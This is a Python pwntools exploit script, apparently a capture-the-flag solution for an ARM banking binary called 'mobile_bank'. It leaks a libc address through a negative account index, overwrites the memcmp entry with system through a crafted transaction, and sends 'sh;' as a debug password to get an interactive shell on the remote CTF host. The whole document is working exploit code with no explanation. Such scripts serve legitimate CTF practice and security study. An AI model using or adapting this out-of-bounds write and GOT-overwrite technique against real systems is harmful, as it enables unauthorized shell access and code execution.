#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
from subprocess import Popen, PIPE
from time import sleep
import sys

binary_file = './mobile_bank'
#libc_file   = './libc.so.6'
libc_file = './libc-2.24.so'

context.arch = 'arm'
context.os   = 'linux'
context.terminal = ['tmux', 'split-window', '-h']

binary = ELF(binary_file)
libc   = ELF(libc_file)
env = { "LD_PRELOAD": libc_file }

def generate_one_gadget_offset(libc_path=libc_file):
    p = Popen(['one_gadget', '-r', libc_path], stdout=PIPE)
    data = p.stdout.read()
    p.wait()
    for addr in data[:-1].split(' '):
        yield int(addr)

gdbscript = '''
file {binary_file}
peda
pwngdb

# commands for fork-server
# set follow-fork-mode child
# set follow-fork-mode parent

# load structure info
# add-symbol-file symbol.o 0

# code base address and heap base address when PIC is enabled
set $code = 0x555555554000
set $heap = 0x555555757000

# define functions here

# define break points here
'''.replace('{binary_file}', binary_file)

def recv_menu(tube, selector):
    tube.recvuntil('choice: ')
    tube.sendline(str(selector))

def set_id(tube, _id):
    recv_menu(tube, 2)
    tube.sendline(str(_id))

def make_transaction(tube, value):
    recv_menu(tube, 4)
    tube.recvuntil('value: ')
    tube.sendline(str(value))

def account_info(tube):
    recv_menu(tube, 5)
    tube.recvuntil('value: ')
    value = int(tube.recvuntil('$')[:-1])
    #return 2**32 + value if value < 0 else value
    return value

def enable_debug(tube, password):
    recv_menu(tube, 6)
    tube.recvuntil('password: ')
    tube.send(password)

def main():
    if len(sys.argv) == 2 and sys.argv[1] == '--local':
        tube = remote('raspberrypi', 23456)
    elif len(sys.argv) == 2 and sys.argv[1] == '--attach':
        tube = process([binary_file], env=env, stderr=sys.stderr)
        gdb.attach(tube, gdbscript=gdbscript)
    elif len(sys.argv) == 2 and sys.argv[1] == '--remote':
        tube = remote('pwn-04.v7frkwrfyhsjtbpfcppnu.ctfz.one', 1337)
    else:
        tube = remote('raspberrypi', 12345)

    set_id(tube, -12) # close
    #close_addr = 2**32 - account_info(tube)
    close_addr = account_info(tube)
    libc_base = close_addr - libc.symbols['close']
    log.info(hex(libc_base))

    set_id(tube, -7) # memcmp
    default_value = account_info(tube)
    log.info(hex(default_value))
    system_addr = libc_base + libc.symbols['system']
    make_transaction(tube, system_addr - default_value)
    enable_debug(tube, 'sh;')
    tube.interactive()

if __name__ == '__main__':
    main()
